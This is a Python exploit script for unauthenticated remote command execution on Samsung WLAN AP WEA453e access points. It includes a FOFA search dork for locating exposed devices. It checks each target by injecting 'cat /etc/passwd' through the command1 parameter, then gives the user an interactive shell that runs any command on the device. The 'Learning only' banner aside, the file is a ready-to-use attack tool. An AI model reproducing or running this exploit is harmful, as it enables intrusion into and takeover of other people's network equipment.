#!/usr/bin/python3
#fofa dork: title="Samsung WLAN AP"
#Author 9527

import sys
import requests
import time
from urllib3.exceptions import InsecureRequestWarning


def Checking():
	try:
		Url = target + "(download)/tmp/hello.txt"
		CkData = "command1=shell:cat /etc/passwd| dd of=/tmp/hello.txt"
		response = requests.post(url = Url,data = CkData,verify = False,timeout = 20)
		if(response.status_code == 200 and 'root:' in response.text):
			return True
		else:
			return False
	except Exception as e:
		#print("checking")
		print("[-] Server Error")

def Exploit():
	Url = target + "(download)/tmp/hello.txt"
	while Checking() is True:
		try:
			command = input("# ")
			if(command == 'exit'):
				sys.exit()
			data = "command1=shell:" + command + "| dd of=/tmp/hello.txt"
			response = requests.post(url = Url,data = data,verify = False,timeout = 20)
			if(response.text == None):
				print("[!] Server reply nothing")
			else:
				print(response.text)
		except Exception as e:
			print("[-] Server not supoort this command")
if __name__ == '__main__':
	if(len(sys.argv) < 2):
		print("|-----------------------------------------------------------------------------------|")
		print("|                              WLAN-AP-WEA453e Rce                                  |")
		print("|                       UseAge: python3 exploit.py target                           |")
		print("|                   Example: python3 exploit.py https://192.168.1.2/                |")
		print("|                             [!] Learning only                                     |")
		print("|___________________________________________________________________________________|")
		sys.exit()
	target = sys.argv[1]
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	Exploit()
